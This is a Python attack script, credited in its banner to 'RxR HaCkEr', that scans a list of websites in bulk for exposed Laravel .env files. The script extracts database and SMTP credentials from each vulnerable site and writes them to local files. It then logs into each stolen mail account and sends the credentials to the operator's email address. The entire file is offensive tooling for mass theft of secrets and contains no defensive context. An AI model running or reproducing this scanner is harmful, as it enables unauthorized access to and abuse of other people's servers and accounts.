import requests, os, base64, random, smtplib, ssl, re, sys
from multiprocessing.dummy import Pool
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from colorama import Fore
from colorama import init 
init(autoreset=True)


fr  =   Fore.RED
fg  =   Fore.GREEN


print("""                                                                              
 _                                     _  
(_)                                   | | 
 _       _____  ____ _____ _   _ _____| | 
| |     (____ |/ ___(____ | | | | ___ | | 
| |_____/ ___ | |   / ___ |\ V /| ____| | 
|_______\_____|_|   \_____| \_/ |_____)\_)
	Coded By RxR HaCkEr
	Forums : https://drcrypter.ru
[+] DATABASE, SMTP Sender 
                                          """)


requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

email = raw_input("[:] Enter Your Email For Test Sender :")
class Laravel:
	def __init__(self):
		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
	
	
	def Sender(self, DataSmtp):

		# Create a secure SSL context
		context = ssl.create_default_context()
		Subject = "Testing Sender By RxR"
		Letter = "SMTP:" +  DataSmtp[0] + "|" + DataSmtp[1] + "|" + DataSmtp[2] + "|" + DataSmtp[3]
		MAIL_HOST, MAIL_PORT, MAIL_USERNAME, MAIL_PASSWORD = DataSmtp[0], DataSmtp[1], DataSmtp[2], DataSmtp[3]
		#Try to log in to server and send email
		try:
			msg = MIMEMultipart("alternative")
			msg['From'] = MAIL_USERNAME
			msg['To'] = email
			msg['Importance'] = 'high'
			msg['X-Priority'] = '1'
			msg['Subject'] = Subject
			msg.attach(MIMEText('{}'.format(Letter), 'plain', "utf-8"))
			server = smtplib.SMTP(MAIL_HOST, MAIL_PORT)
			server.starttls()
			server.login(MAIL_USERNAME, MAIL_PASSWORD)
			text = msg.as_string()
			server.sendmail(MAIL_USERNAME, email, text)
			server.quit()
			print("Target:{} ====> Eamil:{} {}Success Stmp [Good]").format(MAIL_HOST, email,fg)
			open('SMTP_Work.txt','a').write(DataSmtp + "======> Email:" + email + "  => Sending[OK]\n")

		except Exception as e:
			print("Target:{} ====> Eamil:{} {}Faild [Bad]").format(MAIL_HOST, email,fr)
	def Laravel_Env(self, site):
	
		try:
			url = "http://" + self.URLdomain(site)
			respone = requests.get(url + "/.env", headers=self.headers, verify=False, timeout=25).text
			
			LaravelEnv = respone.split()
			
			APP_URL = "APP_URL"
			DB_DATABASE = "DB_DATABASE"
			DB_USERNAME = "DB_USERNAME"
			DB_PASSWORD = "DB_PASSWORD"
			Host_DATABASE =[]
			if('APP_NAME=Laravel' in respone and DB_DATABASE in respone):
				print("Target:{} {} Found Vulnerability").format(url, fg)
				open('LaravelEnv.txt','a').write(url + "/.env" + "\n")
				for data in LaravelEnv:
					if APP_URL in data:
						Host_DATABASE.append(data.split("=")[1])
					elif DB_DATABASE in data:
						Host_DATABASE.append(data.split("=")[1])
					elif DB_USERNAME in data:
						Host_DATABASE.append(data.split("=")[1])
					elif DB_PASSWORD in data:
						Host_DATABASE.append(data.split("=")[1])
						
						
				
				APP_URL, DB_DATABASE, DB_USERNAME, DB_PASSWORD = Host_DATABASE[0], Host_DATABASE[1], Host_DATABASE[2], Host_DATABASE[3]
				open('DATABASE.txt','a').write(APP_URL + "|" + DB_DATABASE + "|" + DB_USERNAME + "|" + DB_PASSWORD + "\n")
				print("::::::::::[DATABASE]::::::::::::")
				if(len(APP_URL) != 0):
					print("{}[APP_URL]:{}").format(fg, APP_URL)
				else:
					print("{}[APP_URL]:{}").format(fr, APP_URL)
				if(len(DB_DATABASE) != 0):
					print("{}[DB_DATABASE]:{}").format(fg, DB_DATABASE)
				else:
					print("{}[DB_DATABASE]:{}").format(fr, DB_DATABASE)
				if(len(DB_USERNAME) != 0):
					print("{}[DB_USERNAME]:{}").format(fg, DB_USERNAME)
				else:
					print("{}[DB_USERNAME]:{}").format(fr, DB_USERNAME)
				if(len(DB_PASSWORD) != 0):
					print("{}[DB_PASSWORD]:{}").format(fg, DB_PASSWORD)
				else:
					print("{}[DB_PASSWORD]:{}").format(fr, DB_PASSWORD)

					
				
				MAIL_HOST = "MAIL_HOST"
				MAIL_PORT = "MAIL_PORT"
				MAIL_USERNAME = "MAIL_USERNAME"
				MAIL_PASSWORD = "MAIL_PASSWORD"
				MAIL_Smtp =[]
				for data in LaravelEnv:
					if MAIL_HOST in data:
						MAIL_Smtp.append(data.split("=")[1])
					elif MAIL_PORT in data:
						MAIL_Smtp.append(data.split("=")[1])
					elif MAIL_USERNAME in data:
						MAIL_Smtp.append(data.split("=")[1])
					elif MAIL_PASSWORD in data:
						MAIL_Smtp.append(data.split("=")[1])
						
						
				MAIL_HOST, MAIL_PORT, MAIL_USERNAME, MAIL_PASSWORD = MAIL_Smtp[0], MAIL_Smtp[1], MAIL_Smtp[2], MAIL_Smtp[3]
				
				open('SMTPs.txt','a').write(MAIL_HOST + "|" + MAIL_PORT + "|" + MAIL_USERNAME + "|" + MAIL_PASSWORD + "\n")
				print("::::::::::[SMTP]::::::::::::")
				if(len(MAIL_HOST) != 0):
					print("{}[MAIL_HOST]:{}").format(fg, MAIL_HOST)
				else:
					print("{}[MAIL_HOST]:{}").format(fr, MAIL_HOST)
				if(len(MAIL_PORT) != 0):
					print("{}[MAIL_PORT]:{}").format(fg, MAIL_PORT)
				else:
					print("{}[MAIL_PORT]:{}").format(fr, MAIL_PORT)
				if(len(MAIL_USERNAME) != 0):
					print("{}[MAIL_USERNAME]:{}").format(fg, MAIL_USERNAME)
				else:
					print("{}[MAIL_USERNAME]:{}").format(fr, MAIL_USERNAME)
				if(len(MAIL_PASSWORD) != 0):
					print("{}[MAIL_PASSWORD]:{}").format(fg, MAIL_PASSWORD)
				else:
					print("{}[MAIL_PASSWORD]:{}").format(fr, MAIL_PASSWORD)
					
					
				print("::::::: Test Sender :::::::::::")
				self.Sender(MAIL_Smtp)
				
				
			else:
				print("Target:{} {}Not Vulnerability").format(url, fr)
				
		except:
			pass
	
	
	

RunLaravel = Laravel()
def Main(url):
	try:
		RunLaravel.Laravel_Env(url)
	except:
		pass
	
mp = Pool(50)
mp.map(Main, target)
mp.close()
mp.join()
